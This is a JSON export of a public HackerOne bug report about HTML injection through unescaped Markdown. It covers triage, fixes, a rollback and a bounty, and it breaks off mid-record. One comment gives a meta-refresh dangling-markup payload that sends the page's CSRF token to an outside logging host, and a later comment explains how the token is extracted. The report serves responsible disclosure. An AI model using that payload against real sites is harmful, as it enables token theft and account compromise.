{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-01-26T16:05:58.005Z", 
    "voters": [
        "updatelap", 
        "intidc", 
        "axolotl", 
        "satishpk1", 
        "japz", 
        "spetr0x", 
        "dyabla", 
        "reddyes"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 110578, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-01-26T02:26:36.122Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "HTML injection can lead to data theft", 
    "is_member_of_team?": null, 
    "vote_count": 8, 
    "summaries": [
        {
            "category": "team", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 1257, 
            "content": "There was a legitimate issue in our app where Markdown was not being escaped properly, but it was not immediately exploitable since it relies on the existence of an injection vulnerability (which can theoretically be introduced in the future). The issue was a real issue that we did not know existed, verified through an investigation and finally patched up.\n\nWe rely on our implementation of Redcarpet to escape the HTML output of any Markdown input, and this output is passed directly into our DOM via `dangerouslySetInnerHTML` in our React component. Because it turns out that we weren't properly escaping this HTML output, this could potentially be exploited.\n\nAll other non-Markdown user-generated content is displayed via React without using `dangerouslySetInnerHTML`, so it is auto-escaped by React and thus not vulnerable to an exploit.", 
            "content_html": "<p>There was a legitimate issue in our app where Markdown was not being escaped properly, but it was not immediately exploitable since it relies on the existence of an injection vulnerability (which can theoretically be introduced in the future). The issue was a real issue that we did not know existed, verified through an investigation and finally patched up.</p>\n\n<p>We rely on our implementation of Redcarpet to escape the HTML output of any Markdown input, and this output is passed directly into our DOM via <code>dangerouslySetInnerHTML</code> in our React component. Because it turns out that we weren&#39;t properly escaping this HTML output, this could potentially be exploited.</p>\n\n<p>All other non-Markdown user-generated content is displayed via React without using <code>dangerouslySetInnerHTML</code>, so it is auto-escaped by React and thus not vulnerable to an exploit.</p>\n"
        }, 
        {
            "category": "researcher", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 1260, 
            "content": "Navigation is something a content security policy can't cover. In some cases, HTML markup, including CSRF tokens, can be encapsulated in an attribute value, as is the case with the url attribute of the meta redirect element, or the href attribute of an anchor tag. This makes it possible for an attacker to send the encapsulated HTML, sometimes containing sensitive information and tokens, as a GET parameter to a remove server. In order to mitigate the risk you can convert your single quotes to their HTML equivalent `&#39;`, as both single and double quotes can be used to enclose an attribute value.", 
            "content_html": "<p>Navigation is something a content security policy can&#39;t cover. In some cases, HTML markup, including CSRF tokens, can be encapsulated in an attribute value, as is the case with the url attribute of the meta redirect element, or the href attribute of an anchor tag. This makes it possible for an attacker to send the encapsulated HTML, sometimes containing sensitive information and tokens, as a GET parameter to a remove server. In order to mitigate the risk you can convert your single quotes to their HTML equivalent <code>&amp;#39;</code>, as both single and double quotes can be used to enclose an attribute value.</p>\n"
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-02-25T02:26:36.443Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-01-14T08:04:27.398Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-14T08:04:27.398Z", 
            "actor": {
                "username": "intidc", 
                "url": "/intidc", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/322/af8a2625572dae0d6229db3226dd685a3e445313_medium.jpg?1475194128"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "*lsquo, sorry.\n\nI saw some pages actually include the CSRF token in the page body. If there would be a single quote somewhere after the form, let's say in the footer, a simple HTML injection before the hidden CSRF field could grab the token.", 
            "markdown_message": "<p>*lsquo, sorry.</p>\n\n<p>I saw some pages actually include the CSRF token in the page body. If there would be a single quote somewhere after the form, let&#39;s say in the footer, a simple HTML injection before the hidden CSRF field could grab the token.</p>\n", 
            "type": "Activities::Comment", 
            "id": 757285, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-14T08:41:01.379Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-14T08:41:01.379Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Happen to know which pages have the CSRF token embedded in them, besides the one mentioned in #103787?", 
            "markdown_message": "<p>Happen to know which pages have the CSRF token embedded in them, besides the one mentioned in <a href=\"/reports/103787\">#103787</a>?</p>\n", 
            "type": "Activities::Comment", 
            "id": 757312, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-14T08:53:51.502Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-14T08:54:19.701Z", 
            "actor": {
                "username": "intidc", 
                "url": "/intidc", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/322/af8a2625572dae0d6229db3226dd685a3e445313_medium.jpg?1475194128"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Well most of the team and account edit settings pages seem to do. Haven't found any of these at risk right now (in contrary to the examples mentioned above). But as a regular single quote could trigger this behavior, I'd make sure to convert the single quotes at these pages as well.", 
            "markdown_message": "<p>Well most of the team and account edit settings pages seem to do. Haven&#39;t found any of these at risk right now (in contrary to the examples mentioned above). But as a regular single quote could trigger this behavior, I&#39;d make sure to convert the single quotes at these pages as well.</p>\n", 
            "type": "Activities::Comment", 
            "id": 757320, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/069/324/0fe1db7aa4d48cd5cc0e0db7fae651c00bfabd78/h1HTMLCSRF.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T225705Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b5ea1985e2d15fd10bc81d97f6d22a606defb1e7d2cb5cfd45a4524c7d684abd", 
                    "type": "image/png", 
                    "id": 69324, 
                    "filename": "h1HTMLCSRF.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2016-01-14T18:36:28.685Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-14T18:36:38.516Z", 
            "actor": {
                "username": "intidc", 
                "url": "/intidc", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/322/af8a2625572dae0d6229db3226dd685a3e445313_medium.jpg?1475194128"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "For your information: I did find a page that'd leak the auth token, for example this page:\n\nhttps://hackerone.com/mobilevikings/groups/8275/edit (team group edit page)\n\nDisplays the group name before and after the token. \n\nSo if an attacker would be able to change it to \n\n> \">'><meta http-equiv=\"refresh\" content='0; url=http://www.ceukelai.re/log.php?text=\n\nHe can steal the token.\n\nScreenie of simulation attached. Even though this particular example probably won't ever be an issue, it proves that there's a potential risk linked to this issue.\n\n", 
            "markdown_message": "<p>For your information: I did find a page that&#39;d leak the auth token, for example this page:</p>\n\n<p><a title=\"https://hackerone.com/mobilevikings/groups/8275/edit\" href=\"https://hackerone.com/mobilevikings/groups/8275/edit\">https://hackerone.com/mobilevikings/groups/8275/edit</a> (team group edit page)</p>\n\n<p>Displays the group name before and after the token. </p>\n\n<p>So if an attacker would be able to change it to </p>\n\n<blockquote>\n<p>&quot;&gt;&#39;&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&#39;0; url=<a title=\"http://www.ceukelai.re/log.php?text=\" href=\"/redirect?signature=87f9d9a630e46d529b524c38ef4c1802bb2916d9&amp;url=http%3A%2F%2Fwww.ceukelai.re%2Flog.php%3Ftext%3D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://www.ceukelai.re/log.php?text=</span><i class=\"icon-external-link\"></i></a></p>\n</blockquote>\n\n<p>He can steal the token.</p>\n\n<p>Screenie of simulation attached. Even though this particular example probably won&#39;t ever be an issue, it proves that there&#39;s a potential risk linked to this issue.</p>\n", 
            "type": "Activities::Comment", 
            "id": 758096, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-14T21:53:33.019Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-14T21:53:33.019Z", 
            "actor": {
                "username": "andrewone", 
                "url": "/andrewone", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/236/14209407e303acb7aa505e80cb37f4b45da80100_medium.png?1418422182"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Thanks @intidc for the additional details. We will see what we can do here.", 
            "markdown_message": "<p>Thanks <a href=\"/intidc\">@intidc</a> for the additional details. We will see what we can do here.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 758482, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-15T13:44:07.509Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-15T13:45:06.157Z", 
            "actor": {
                "username": "intidc", 
                "url": "/intidc", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/322/af8a2625572dae0d6229db3226dd685a3e445313_medium.jpg?1475194128"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Note: use &apos; (apos) instead of &lsquo; (lsquo)/&rsquo; (rsquo)", 
            "markdown_message": "<p>Note: use &#39; (apos) instead of \u2018 (lsquo)/\u2019 (rsquo)</p>\n", 
            "type": "Activities::Comment", 
            "id": 759306, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-15T23:34:02.757Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-15T23:34:02.757Z", 
            "actor": {
                "username": "andrewone", 
                "url": "/andrewone", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/236/14209407e303acb7aa505e80cb37f4b45da80100_medium.png?1418422182"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hi @intidc,\n\nIn your example, how is the attacker stealing the CSRF token using that meta refresh tag? Also, wouldn't the attacker need to be a team admin in this case?", 
            "markdown_message": "<p>Hi <a href=\"/intidc\">@intidc</a>,</p>\n\n<p>In your example, how is the attacker stealing the CSRF token using that meta refresh tag? Also, wouldn&#39;t the attacker need to be a team admin in this case?</p>\n", 
            "type": "Activities::Comment", 
            "id": 760157, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-15T23:48:20.042Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-15T23:48:20.042Z", 
            "actor": {
                "username": "intidc", 
                "url": "/intidc", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/322/af8a2625572dae0d6229db3226dd685a3e445313_medium.jpg?1475194128"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hey Andrew,\n\nIf the injection is successful, the url part of the META attribute would look like this (it's highlighted in blue in the screenshot I provided earlier)\n\nhttp://www.ceukelai.re/log.php?text=</h2></div><form class=\"edit_team_member_group\"... {bunch of stuff including the token}, until we reach the next single quote located in the team_member_group_name input field. \n\nSo if the victim would visit the page, he would be redirected to my logging script and the HTML data, including the form token would be passed as a GET parameter (text). Once my logger receives the HTML, it can extract the token and abuse it. If single quote were encoded as, for example &apos, this wouldn't happen as there would no way for an attacker to enclose the form data in the refresh URL argument.\n\nOn the attack scenario: yes, I suppose - but that's just an example of the CSRF token leakage. At this moment an attack on the report page (see initial post) would be more likely to happen. If H1 would have an unconverted single quote somewhere in the footer, all pages would be at risk.\n\nHave a nice weekend,\n\nInti ", 
            "markdown_message": "<p>Hey Andrew,</p>\n\n<p>If the injection is successful, the url part of the META attribute would look like this (it&#39;s highlighted in blue in the screenshot I provided earlier)</p>\n\n<p><a title=\"http://www.ceukelai.re/log.php?text=\" href=\"/redirect?signature=87f9d9a630e46d529b524c38ef4c1802bb2916d9&amp;url=http%3A%2F%2Fwww.ceukelai.re%2Flog.php%3Ftext%3D\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://www.ceukelai.re/log.php?text=</span><i class=\"icon-external-link\"></i></a>&lt;/h2&gt;&lt;/div&gt;&lt;form class=&quot;edit_team_member_group&quot;... {bunch of stuff including the token}, until we reach the next single quote located in the team_member_group_name input field. </p>\n\n<p>So if the victim would visit the page, he would be redirected to my logging script and the HTML data, including the form token would be passed as a GET parameter (text). Once my logger receives the HTML, it can extract the token and abuse it. If single quote were encoded as, for example &amp;apos, this wouldn&#39;t happen as there would no way for an attacker to enclose the form data in the refresh URL argument.</p>\n\n<p>On the attack scenario: yes, I suppose - but that&#39;s just an example of the CSRF token leakage. At this moment an attack on the report page (see initial post) would be more likely to happen. If H1 would have an unconverted single quote somewhere in the footer, all pages would be at risk.</p>\n\n<p>Have a nice weekend,</p>\n\n<p>Inti </p>\n", 
            "type": "Activities::Comment", 
            "id": 760170, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-20T02:38:45.523Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-20T02:38:45.523Z", 
            "actor": {
                "username": "andrewone", 
                "url": "/andrewone", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/236/14209407e303acb7aa505e80cb37f4b45da80100_medium.png?1418422182"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Quick update here -- I'm still working on a fix. It's a little more complicated than what I'd initially thought since we use different renderers for different parts of the UI.", 
            "markdown_message": "<p>Quick update here -- I&#39;m still working on a fix. It&#39;s a little more complicated than what I&#39;d initially thought since we use different renderers for different parts of the UI.</p>\n", 
            "type": "Activities::Comment", 
            "id": 764643, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-20T05:35:19.445Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-20T05:35:41.723Z", 
            "actor": {
                "username": "intidc", 
                "url": "/intidc", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/322/af8a2625572dae0d6229db3226dd685a3e445313_medium.jpg?1475194128"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Take tour time! A good fix > a quick fix. Let me know if you need any help.\n\n -Inti", 
            "markdown_message": "<p>Take tour time! A good fix &gt; a quick fix. Let me know if you need any help.</p>\n\n<p>-Inti</p>\n", 
            "type": "Activities::Comment", 
            "id": 764764, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-20T10:07:39.416Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-20T10:07:39.416Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "See also https://stackoverflow.com/questions/2083754/why-shouldnt-apos-be-used-to-escape-single-quotes for why it may make more sense to use `&#39;` instead of `&apos;`. Note that Ruby's `CGI.escapeHTML` uses `&#39;` as well.", 
            "markdown_message": "<p>See also <a title=\"https://stackoverflow.com/questions/2083754/why-shouldnt-apos-be-used-to-escape-single-quotes\" href=\"/redirect?signature=48f1c976b358c4dcf88f402486e0b32627bbc0db&amp;url=https%3A%2F%2Fstackoverflow.com%2Fquestions%2F2083754%2Fwhy-shouldnt-apos-be-used-to-escape-single-quotes\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://stackoverflow.com/questions/2083754/why-shouldnt-apos-be-used-to-escape-single-quotes</span><i class=\"icon-external-link\"></i></a> for why it may make more sense to use <code>&amp;#39;</code> instead of <code>&amp;apos;</code>. Note that Ruby&#39;s <code>CGI.escapeHTML</code> uses <code>&amp;#39;</code> as well.</p>\n", 
            "type": "Activities::Comment", 
            "id": 764913, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-23T17:37:13.341Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-23T17:37:13.341Z", 
            "actor": {
                "username": "intidc", 
                "url": "/intidc", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/322/af8a2625572dae0d6229db3226dd685a3e445313_medium.jpg?1475194128"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Interesting point @reed, thanks!\n\nI think browsers should also implement a meta-refresh CSP directive. Apparently someone proposed this [back in 2011](https://lists.w3.org/Archives/Public/public-web-security/2011Jun/0157.html).", 
            "markdown_message": "<p>Interesting point <a href=\"/reed\">@reed</a>, thanks!</p>\n\n<p>I think browsers should also implement a meta-refresh CSP directive. Apparently someone proposed this <a href=\"/redirect?signature=e523fd51e54979f349e869443d08eb07188dbdc3&amp;url=https%3A%2F%2Flists.w3.org%2FArchives%2FPublic%2Fpublic-web-security%2F2011Jun%2F0157.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>back in 2011</span><i class=\"icon-external-link\"></i></a>.</p>\n", 
            "type": "Activities::Comment", 
            "id": 769615, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-25T22:28:45.254Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-25T22:28:45.254Z", 
            "actor": {
                "username": "andrewone", 
                "url": "/andrewone", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/236/14209407e303acb7aa505e80cb37f4b45da80100_medium.png?1418422182"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hi @intidc,\n\nThere is some underlying issue that could not be solved easily and will require some further investigation, but we've deployed an interim fix that escapes the quotes in any Markdown that is passed to the front end. Can you verify that this resolves the immediate risk?", 
            "markdown_message": "<p>Hi <a href=\"/intidc\">@intidc</a>,</p>\n\n<p>There is some underlying issue that could not be solved easily and will require some further investigation, but we&#39;ve deployed an interim fix that escapes the quotes in any Markdown that is passed to the front end. Can you verify that this resolves the immediate risk?</p>\n", 
            "type": "Activities::Comment", 
            "id": 771613, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-25T22:44:45.590Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-25T22:44:45.590Z", 
            "actor": {
                "username": "intidc", 
                "url": "/intidc", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/322/af8a2625572dae0d6229db3226dd685a3e445313_medium.jpg?1475194128"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hi, I can confirm this eliminates the risk of the example I provided (team group edit page), however, single quotes in user generated content (such as report bodies and titles, summaries, replies) don't seem to be escaped yet, so the risk remains.", 
            "markdown_message": "<p>Hi, I can confirm this eliminates the risk of the example I provided (team group edit page), however, single quotes in user generated content (such as report bodies and titles, summaries, replies) don&#39;t seem to be escaped yet, so the risk remains.</p>\n", 
            "type": "Activities::Comment", 
            "id": 771632, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-26T00:09:45.883Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-26T00:09:45.883Z", 
            "actor": {
                "username": "andrewone", 
                "url": "/andrewone", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/236/14209407e303acb7aa505e80cb37f4b45da80100_medium.png?1418422182"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "@intidc,\n\nAll our other UGC is embedded within React components, which should be safe according to documentation:\n> By default, React escapes the HTML to prevent XSS. If you really want to render HTML, you can use the dangerouslySetInnerHTML property.\n\nI've experimented with escaping in our various layers, from the JSON assembled by JBuilder to the CJSX in our React components, but none of this adds any additional value. With React auto-escaping/unescaping during the rendering process, any quote mark within our values should not accidentally match up with an unterminated quote mark from an injected HTML node.\n\nLet me know if there's anything I may have missed.", 
            "markdown_message": "<p><a href=\"/intidc\">@intidc</a>,</p>\n\n<p>All our other UGC is embedded within React components, which should be safe according to documentation:</p>\n\n<blockquote>\n<p>By default, React escapes the HTML to prevent XSS. If you really want to render HTML, you can use the dangerouslySetInnerHTML property.</p>\n</blockquote>\n\n<p>I&#39;ve experimented with escaping in our various layers, from the JSON assembled by JBuilder to the CJSX in our React components, but none of this adds any additional value. With React auto-escaping/unescaping during the rendering process, any quote mark within our values should not accidentally match up with an unterminated quote mark from an injected HTML node.</p>\n\n<p>Let me know if there&#39;s anything I may have missed.</p>\n", 
            "type": "Activities::Comment", 
            "id": 771715, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-26T00:22:53.714Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-26T00:22:53.714Z", 
            "actor": {
                "username": "intidc", 
                "url": "/intidc", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/322/af8a2625572dae0d6229db3226dd685a3e445313_medium.jpg?1475194128"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Thanks for the info, I've overseen that. Should be good! Thanks for the fix!", 
            "markdown_message": "<p>Thanks for the info, I&#39;ve overseen that. Should be good! Thanks for the fix!</p>\n", 
            "type": "Activities::Comment", 
            "id": 771731, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "intidc", 
                "url": "/intidc"
            }, 
            "created_at": "2016-01-26T02:25:49.383Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-26T02:25:49.383Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 771840, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-01-26T02:26:24.451Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-26T02:26:24.451Z", 
            "actor": {
                "url": "/security", 
                "profile": {
                    "name": "HackerOne"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/013/28af2ada2cc00aa9427504fc5a14f587362df84b_medium.png?1445331713"
                }
            }, 
            "team_handle": "security", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "intidc", 
                "url": "/intidc"
            }, 
            "message": "Thanks for the report, @intidc! Happy hacking!", 
            "markdown_message": "<p>Thanks for the report, <a href=\"/intidc\">@intidc</a>! Happy hacking!</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 771841, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-26T02:26:36.146Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-26T02:26:36.146Z", 
            "actor": {
                "username": "reed", 
                "url": "/reed", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 771843, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-26T16:05:58.047Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-26T16:05:58.047Z", 
            "actor": {
                "username": "intidc", 
                "url": "/intidc", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/322/af8a2625572dae0d6229db3226dd685a3e445313_medium.jpg?1475194128"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Awesome, thanks for the bounty!", 
            "markdown_message": "<p>Awesome, thanks for the bounty!</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 772585, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-26T16:05:58.673Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-26T16:05:58.673Z", 
            "actor": {
                "username": "intidc", 
                "url": "/intidc", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/322/af8a2625572dae0d6229db3226dd685a3e445313_medium.jpg?1475194128"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 772586, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-01-26T22:45:59.041Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-01-26T22:45:59.041Z", 
            "actor": {
                "username": "andrewone", 
                "url": "/andrewone", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/236/14209407e303acb7aa505e80cb37f4b45da80100_medium.png?1418422182"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "Hi @intidc,\n\nIt has been brought to our attention that the fix we released causes some undesirable side effects, so we will be rolling back the fix. The issue will thereby remain intact until we find a better solution.", 
            "markdown_message": "<p>Hi <a href=\"/intidc\">@intidc</a>,</p>\n\n<p>It has been brought to our attention that the fix we released causes some undesirable side effects, so we will be rolling back the fix. The issue will thereby remain intact until we find a better solution.</p>\n", 
            "type": "Activities::Comment", 
            "id": 773222, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-02-23T21:48:39.117Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-02-23T21:48:39.117Z", 
            "actor": {
                "username": "andrewone", 
                "url": "/andrewone", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/236/14209407e303acb7aa505e80cb37f4b45da80100_medium.png?1418422182"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "security", 
            "message": "A new fix has been deployed, so this should now be fixed once again.", 
            "markdown_message": "<p>A new fix has been deployed, so this should now be fixed once again.</p>\n", 
            "type": "Activities::Comment", 
            "id": 809414, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-02-23T22:50:57.632Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-02-23T22:50:57.632Z", 
            "actor": {
